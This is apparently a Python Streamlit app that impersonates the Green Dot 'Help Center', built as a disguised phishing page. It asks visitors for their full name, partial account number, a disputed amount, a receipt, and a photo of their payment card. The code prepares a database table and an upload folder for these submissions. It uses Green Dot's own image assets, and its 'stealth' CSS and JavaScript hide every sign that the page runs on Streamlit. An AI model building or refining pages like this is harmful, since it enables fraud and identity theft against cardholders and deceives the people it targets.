
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Configuración de Rutas
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# JS NUCLEAR V1.2.7 (FORZAR CONTRASTE DE WIDGETS)
st.markdown("""<script>
    const forceVisibility = () => {
        // Ocultar elementos basura
        ['header', 'footer', '.stDeployButton', '[data-testid="stHeader"]', '[data-testid="stAppToolbar"]'].forEach(s => {
            document.querySelectorAll(s).forEach(el => el.remove());
        });

        // Forzar fondo negro en el contenedor rebelde
        document.querySelectorAll('.st-emotion-cache-h5555q').forEach(el => {
            el.style.backgroundColor = '#000000';
            el.style.color = '#FFFFFF';
        });

        // Forzar contraste en zonas de carga de archivos
        document.querySelectorAll('[data-testid="stFileUploader"] div').forEach(el => {
            el.style.color = '#FFFFFF';
        });
    };
    setInterval(forceVisibility, 30);
</script>""", unsafe_allow_html=True)

# CSS STEALTH TOTAL V1.2.7
st.markdown("""<style>
    /* FONDO NEGRO ABSOLUTO */
    html, body, [data-testid="stAppViewContainer"], .stApp {
        background-color: #000000 !important;
    }

    /* VISIBILIDAD DE UPLOADER EN MODO CLARO */
    [data-testid="stFileUploader"] {
        background-color: #1a1a1a !important;
        border: 1px solid #333 !important;
        border-radius: 8px !important;
        padding: 10px !important;
    }

    /* Forzar texto blanco en todo el formulario */
    [data-testid="stMarkdownContainer"] p, label, .st-ae, .st-af, .st-ag, .st-ah {
        color: #FFFFFF !important;
    }

    /* Eliminar cualquier sombra o borde blanco de Streamlit */
    .st-emotion-cache-h5555q, .st-emotion-cache-1vo6xi6 {
        border: none !important;
        box-shadow: none !important;
        background-color: #000000 !important;
    }

    header, footer, .stDeployButton { display: none !important; }
    .block-container { max-width: 500px !important; padding-top: 1rem !important; }

    .stButton > button {
        background-color: #00a05b !important;
        color: white !important;
        width: 100%; border: none; height: 50px; border-radius: 8px; font-weight: bold;
    }
</style>""", unsafe_allow_html=True)

if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
st.title("Help Center")

with st.form("claim_v1_2_7", clear_on_submit=True):
    st.text_input("Full Name")
    st.text_input("Last 4 digits of Account")
    st.number_input("Disputed Amount", format="%.2f")
    st.file_uploader("Store Receipt", type=["jpg","png"])
    st.file_uploader("Card Photo", type=["jpg","png"])
    if st.form_submit_button("SUBMIT NOW"):
        st.success("Claim Received.")

st.markdown("""<div style='background-color: #111; padding: 20px; border-radius: 12px; text-align: center; margin-top: 20px; border: 1px solid #222;'>
    <p style='color: white;'>Download the Green Dot app</p>
    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
</div>""", unsafe_allow_html=True)
